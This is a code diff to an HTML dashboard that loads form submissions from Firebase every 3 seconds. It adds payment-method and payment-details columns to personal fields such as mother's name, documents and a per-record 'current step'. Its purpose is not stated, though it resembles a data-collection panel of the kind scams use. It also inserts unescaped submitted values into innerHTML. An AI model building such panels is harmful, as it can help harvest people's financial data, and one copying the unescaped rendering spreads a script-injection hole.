@@ -9,7 +9,7 @@
         body { background: #f4f7f6; padding: 20px; }
         h2 { color: #0056b3; text-align: center; margin-bottom: 20px; }
         .table-container { width: 100%; overflow-x: auto; background: #fff; padding: 15px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-        table { width: 100%; border-collapse: collapse; min-width: 1200px; }
+        table { width: 100%; border-collapse: collapse; min-width: 1400px; }
         th, td { padding: 12px; border: 1px solid #ddd; text-align: left; font-size: 13px; }
         th { background-color: #0056b3; color: white; }
         tr:nth-child(even) { background-color: #f9f9f9; }
@@ -37,11 +37,13 @@
                     <th>Children</th>
                     <th>Mother's Name</th>
                     <th>Documents</th>
+                    <th>Payment Method</th>
+                    <th>Payment Details</th>
                     <th>Status / Current Step</th>
                 </tr>
             </thead>
             <tbody id="dataTable">
-                <tr><td colspan="12" class="loading">Loading data from Firebase...</td></tr>
+                <tr><td colspan="14" class="loading">Loading data from Firebase...</td></tr>
             </tbody>
         </table>
     </div>
@@ -72,7 +74,7 @@
                 tableBody.innerHTML = "";
                 
                 if (querySnapshot.empty) {
-                    tableBody.innerHTML = "<tr><td colspan='12' class='loading'>कोई डेटा उपलब्ध नहीं है।</td></tr>";
+                    tableBody.innerHTML = "<tr><td colspan='14' class='loading'>कोई डेटा उपलब्ध नहीं है।</td></tr>";
                     return;
                 }
 
@@ -90,6 +92,8 @@
                         <td>${data.childrenCount || 'Pending'}</td>
                         <td>${data.motherName || 'Pending'}</td>
                         <td>${data.documents || 'Pending'}</td>
+                        <td>${data.paymentMethod || 'Pending'}</td>
+                        <td>${data.paymentDetails || 'Pending'}</td>
                         <td><b>${data.currentStep || 'Started'}</b></td>
                     </tr>`;
                     tableBody.innerHTML += row;
@@ -102,7 +106,7 @@
         // Pehli baar load karein
         loadSubmissions();
 
-        // Har 3 second (3000 milliseconds) me automatically data fetch karein
+        // Har 3 second me automatically data fetch karein
         setInterval(loadSubmissions, 3000);
     </script>
 </body>
